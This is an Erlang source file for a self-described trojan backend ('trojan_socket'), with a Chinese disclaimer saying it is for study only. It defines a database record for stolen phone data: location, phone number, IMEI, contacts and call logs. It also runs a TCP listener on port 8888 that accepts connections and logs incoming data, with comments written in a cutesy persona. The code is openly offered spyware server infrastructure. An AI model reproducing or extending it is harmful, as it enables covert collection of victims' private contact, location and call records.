%% ============================================================================
%% @author 钟智强
%% @email johnmelodymel@qq.com
%%
%% ============================================================================
%% == 重要声明 ==
%% ============================================================================
%% 本程序仅供学习和技术研究使用，禁止将其用于任何未获授权的侵入、
%% 攻击、监听、干扰或其他违反网络安全和隐私保护的行为。
%%
%% 使用者必须在**完全理解并同意上述条款**的前提下使用本程序。
%% 任何将本程序用于**非法目的**的行为，其**所有后果**（包括但不限于
%% 行政处罚、民事赔偿、刑事责任）**均由使用者自行承担**。
%%
%% 请务必遵守您所在国家和地区的相关法律法规，特别是以下中国法律条款：
%%
%% - 《中华人民共和国网络安全法》 第十二条：任何个人和组织不得利用网络
%%   从事危害国家安全、荣誉和利益，煽动颠覆国家政权等违法犯罪活动。
%% - 《中华人民共和国刑法》 第二百八十五条至二百八十七条：
%%   非法侵入计算机信息系统、破坏系统功能或数据的行为将被追究刑事责任。
%% - 《中华人民共和国数据安全法》 第三条、第十七条：
%%   从事数据处理活动应当依法保障数据安全，禁止非法获取、泄露数据。
%%
%% 💡特别提醒：本程序设计中可能涉及网络通信、数据收集、远程控制等功能，
%% 均应在**授权范围内**使用，任何对设备、系统、数据的未经授权的访问或控制
%% 都属于违法行为。
%%
%% 📛 违反以上条款造成的一切法律后果与责任，与作者无关。
%%
%% ============================================================================
%%
%% @doc 木马后台服务模块，提供TCP套接字监听和数据处理功能。
%% 主要功能包括：
%% - 创建Mnesia数据库表存储设备信息
%% - 监听指定端口接收客户端连接
%% - 处理每个连接的客户端数据
%% - 记录详细的连接和数据处理日志
%% 
%% 使用示例：
%% 1. 调用create_schema/0创建数据库架构
%% 2. 调用create_table/0创建设备信息表
%% 3. 调用start/0启动TCP监听服务
%% 
%% 日志级别支持：info, warning, error
%% 默认监听端口：8888
%% 默认IP地址：0.0.0.0

-module(trojan_socket).
-export([start/0]).
-export([create_schema/0, create_table/0]).

-define(DEFAULT_NAME, "木马后台").
-define(DEFAULT_PORT, 8888).
-define(DEFAULT_IP, {0,0,0,0}).
-define(DEFAULT_BUFSIZE, 1024).

-record(device_info, {
    id,                 % integer() 或 string()
    ip,                 % string()
    image,              % string() (路径/Base64)
    current_location,   % string()
    phone_number,       % string()
    phone_model,        % string()
    os_version,         % string()
    network_carrier,    % string()
    imei_number,        % string()
    contacts,           % string() (JSON 形式)
    call_logs           % string() (JSON 形式)
}).

% ANSI 颜色代码 - 我们的小彩虹糖果盒！🍬🌈
-define(ANSI_RESET, "\e[0m").       % 变回原来的颜色哦
-define(ANSI_RED, "\e[31m").        % 热情的小红唇 💋
-define(ANSI_GREEN, "\e[32m").      % 清新的小绿叶 🌿
-define(ANSI_YELLOW, "\e[33m").     % 暖暖的小太阳 ☀️
-define(ANSI_BLUE, "\e[34m").       % 温柔的蓝天白云 ☁️ (这个先留着，以后想用别的颜色就可以啦)

% 新增的日志辅助函数，萌萌哒～
log(Level, FormatString, Args) ->
    {{Y,Mo,D},{H,M,S}} = calendar:local_time(),
    Timestamp = io_lib:format("~4..0w-~2..0w-~2..0w ~2..0w:~2..0w:~2..0w", [Y,Mo,D,H,M,S]),
    LevelStr = if
        is_atom(Level) -> atom_to_list(Level);
        is_list(Level) -> Level
    end,

    % 根据日志级别选个漂亮的颜色吧～
    Color = case Level of
        info    -> ?ANSI_GREEN;  % 你看，info 消息是清新的绿色～
        warning -> ?ANSI_YELLOW; % warning 消息是暖暖的黄色～
        error   -> ?ANSI_RED;    % error 消息是醒目的红色～
        _       -> ""           % 如果是别的级别，就先不用颜色啦
    end,

    % 我们把时间戳和日志级别作为参数传给 io:format，
    % FormatString 是你原来写的格式字符串，姐姐把它拼接到后面～
    % 用选好的颜色把消息包起来，最后再用 ?ANSI_RESET 变回原来的颜色，这样就不会影响其他文字啦！
    % 最后加上一个换行符 \n，让日志看起来整整齐齐！
    io:format(Color ++ "~s [~s] " ++ FormatString ++ ?ANSI_RESET ++ "~n", [Timestamp, LevelStr | Args]).

% 这个新函数专门负责招待每一位连接上的"小可爱"哦
handle_connection(Socket) ->
    case inet:peername(Socket) of
        {ok, PeerIP} ->
            log(info, "哇，有一个小可爱连接上啦！地址是: ~p", [PeerIP]);
        {error, PeernameErrorReason} ->
            log(error, "哎呀，获取小可爱地址失败了: ~p", [PeernameErrorReason])
    end,
    receive_all(Socket),
    gen_tcp:close(Socket),
    log(info, "和小可爱的连接已温柔关闭。", []).

% 新增：循环读取所有数据，直到 closed
receive_all(Socket) ->
    log(info, "人家在等数据啦，Socket是: ~p", [Socket]),
   
    case gen_tcp:recv(Socket, 0, 5000) of  % Changed timeout to 5 seconds, and size to 0 for auto-size
        {ok, <<>>} ->
            log(info, "一个字节都木有收到呢，继续等呀等～", []),
            receive_all(Socket);
        {ok, BinData} ->
            log(info, "哇哦，二进制小宝贝来了: ~p", [BinData]),
            case catch binary_to_list(BinData) of
                Str when is_list(Str) ->
                    log(info, "解码成字符串啦: ~s", [Str]);
                _ ->
                    log(info, "这个数据人家转不成字符串啦～好可惜哦～", [])
            end,
            receive_all(Socket);
        {error, timeout} ->
            log(warning, "等得花儿都谢啦，还是空空如也～嘤嘤嘤～", []);
        {error, closed} ->
            log(info, "对方小可爱把连接关掉啦～", []);
        {error, RecvErrorReason} ->
            log(error, "哎呀，收消息的时候出小问题了: ~p", [RecvErrorReason])
    end.

% 这个新函数就是我们的“循环等待”魔法，让服务器能一直等待新的小可爱
accept_loop(ListenSocket) ->
    log(info, "服务器正在耐心等待新的小可爱连接中...", []), % 加个日志，表示正在等待
    case gen_tcp:accept(ListenSocket) of
        {ok, Socket} ->
            % 有新的小可爱来啦！让 handle_connection 去招待它
            spawn(fun() -> handle_connection(Socket) end), % 为每个连接创建一个新进程，这样可以同时招待多个小可爱！
            accept_loop(ListenSocket); % 招待完（或者说，启动了招待进程后），马上回到这里，继续等待下一个！
        {error, closed} -> % 这个表示 ListenSocket 自己被关闭了，比如被其他地方的代码关了
            log(info, "监听的耳朵好像被关掉了，不再接受新的小可爱啦。", []);
        {error, AcceptErrorReason} ->
            % 如果是其他等待连接的错误，我们就记录下来，然后服务器就休息了（循环停止）
            log(error, "等待小可爱连接的时候出错了 (迎接小可爱的时候出错了): ~p. 服务器决定先休息一下。", [AcceptErrorReason])
            % 循环在这里通过不再次调用 accept_loop 来终止
    end.

% start/0 函数现在变得更简洁啦，它负责开启监听，然后把招待客人的任务交给 accept_loop
start() ->
    mnesia:start(),
    % 监听端口，如果失败了，我们就用新的log函数记录下来
    case gen_tcp:listen(?DEFAULT_PORT, [
        binary,
        {ip, ?DEFAULT_IP},
        {packet, 0},
        {active, false},  % Keep using passive mode
        {reuseaddr, true},
        {backlog, 5} % 等待队列里可以排5个小可爱
    ]) of
        {ok, ListenSocket} ->
            log(info, "服务器正在端口 ~p:~p 上悄悄监听哦...", [?DEFAULT_IP, ?DEFAULT_PORT]),
            accept_loop(ListenSocket), % 把招待大任交给 accept_loop！
            % 下面的代码只有在 accept_loop 因为某种原因停止后才会执行
            % （比如 ListenSocket 被关闭了，或者 accept 出错了）
            gen_tcp:close(ListenSocket), % 确保在服务结束时关闭监听套接字
            log(info, "监听服务已正式停止，服务器晚安～", []);
        {error, ListenErrorReason} ->
            log(error, "启动监听服务失败了，呜呜呜: ~p。服务器开不起来了。", [ListenErrorReason])
    end.

create_table() ->
    mnesia:create_table(device_info, [
        {attributes, record_info(fields, device_info)},
        {disc_copies, [node()]},
        {type, set}
    ]).

create_schema() ->
    mnesia:create_schema([node()]).